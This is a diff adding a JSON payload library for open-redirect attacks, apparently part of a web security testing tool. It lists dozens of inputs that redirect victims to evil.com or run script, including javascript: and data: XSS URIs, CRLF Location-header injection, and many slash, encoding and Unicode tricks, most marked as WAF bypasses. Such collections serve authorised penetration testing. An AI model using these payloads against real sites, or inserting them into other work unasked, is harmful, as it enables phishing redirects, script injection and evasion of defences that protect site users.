@@ -1,0 +1,61 @@
+{
+  "category": "open_redirect",
+  "contexts": {
+    "url_parameter": {
+      "description": "Open redirect payloads for URL-based redirect parameters (redirect, url, next, return, goto)",
+      "payloads": [
+        {"payload": "https://evil.com", "description": "Absolute URL to external domain", "waf_bypass": false},
+        {"payload": "//evil.com", "description": "Protocol-relative redirect bypass", "waf_bypass": false},
+        {"payload": "\\/\\/evil.com", "description": "Escaped slash bypass — some parsers unescape before redirect", "waf_bypass": true},
+        {"payload": "////evil.com", "description": "Quadruple slash bypass — parser normalisation edge case", "waf_bypass": true},
+        {"payload": "https:evil.com", "description": "Missing slashes — lenient parsers accept scheme:host without //", "waf_bypass": true},
+        {"payload": "https://evil.com@target.com", "description": "At-sign URL authority confusion", "waf_bypass": true},
+        {"payload": "https://target.com.evil.com", "description": "Subdomain of attacker domain ending with target", "waf_bypass": true},
+        {"payload": "//evil.com%2F%2F", "description": "URL-encoded double slash after domain", "waf_bypass": true},
+        {"payload": "https://evil.com%00.target.com", "description": "Null byte injection to truncate domain check", "waf_bypass": true},
+        {"payload": "//evil.com?target.com", "description": "Target domain as query param to bypass domain checks", "waf_bypass": true},
+        {"payload": "//evil%E3%80%82com", "description": "Unicode full-width dot (U+3002) to bypass dot-based domain filters", "waf_bypass": true},
+        {"payload": "/\\evil.com", "description": "Backslash after path — some parsers treat backslash as forward slash", "waf_bypass": true}
+      ]
+    },
+    "protocol": {
+      "description": "Redirect payloads using protocol-level tricks (javascript:, data:)",
+      "payloads": [
+        {"payload": "javascript:alert(document.domain)", "description": "JavaScript protocol redirect — yields XSS", "waf_bypass": false},
+        {"payload": "javascript:alert(document.domain)//", "description": "JavaScript protocol with trailing comment to bypass path checks", "waf_bypass": true},
+        {"payload": "data:text/html,<script>alert(1)</script>", "description": "data: URI redirect — browser executes contents as HTML", "waf_bypass": false},
+        {"payload": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "description": "Base64-encoded data: URI to bypass content filters", "waf_bypass": true},
+        {"payload": "jaVasCript:alert(1)", "description": "Mixed case JavaScript protocol bypass", "waf_bypass": true},
+        {"payload": "java%0d%0ascript:alert(1)", "description": "CRLF in protocol name to bypass string matching", "waf_bypass": true},
+        {"payload": "%0d%0aLocation:https://evil.com", "description": "CRLF header injection — inject Location header directly", "waf_bypass": true},
+        {"payload": "vbscript:msgbox(1)", "description": "VBScript protocol redirect (IE/Edge legacy)", "waf_bypass": false}
+      ]
+    },
+    "path_based": {
+      "description": "Open redirect via path manipulation without explicit URL parameter",
+      "payloads": [
+        {"payload": "/https://evil.com", "description": "Absolute URL as path — some routers follow it", "waf_bypass": false},
+        {"payload": "/%2F/evil.com", "description": "URL-encoded slash to form protocol-relative URL", "waf_bypass": true},
+        {"payload": "/evil.com", "description": "Domain as path — relies on open proxy or path-based redirect", "waf_bypass": false},
+        {"payload": "/.evil.com", "description": "Dot-prefixed domain in path", "waf_bypass": true},
+        {"payload": "/%09/evil.com", "description": "Tab character before slash to bypass path validation", "waf_bypass": true},
+        {"payload": "/evil.com%23target.com", "description": "Fragment injection to mask real destination", "waf_bypass": true},
+        {"payload": "///evil.com", "description": "Triple slash — some parsers strip leading slashes", "waf_bypass": true},
+        {"payload": "//%2Fevil.com", "description": "Double encoded path separator confusion", "waf_bypass": true}
+      ]
+    },
+    "encoding_bypass": {
+      "description": "Encoding and obfuscation tricks to bypass redirect URL validation",
+      "payloads": [
+        {"payload": "%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d", "description": "Fully URL-encoded https://evil.com", "waf_bypass": true},
+        {"payload": "https://evil.com%252f%252f", "description": "Double URL-encoded slashes", "waf_bypass": true},
+        {"payload": "https://evil。com", "description": "Unicode ideographic full stop (U+3002) as dot replacement", "waf_bypass": true},
+        {"payload": "https://ⅇvil.com", "description": "Unicode lookalike characters in domain", "waf_bypass": true},
+        {"payload": "https://evil.com/%2e%2e", "description": "URL-encoded dot-dot after domain", "waf_bypass": true},
+        {"payload": "https%3a%2f%2fevil.com", "description": "URL-encoded scheme separator", "waf_bypass": true},
+        {"payload": "https://evil.com\\@target.com", "description": "Backslash before @ to confuse authority parsing", "waf_bypass": true},
+        {"payload": "http://0x42660706", "description": "Hex IP address (example: 66.102.7.6)", "waf_bypass": true}
+      ]
+    }
+  }
+}
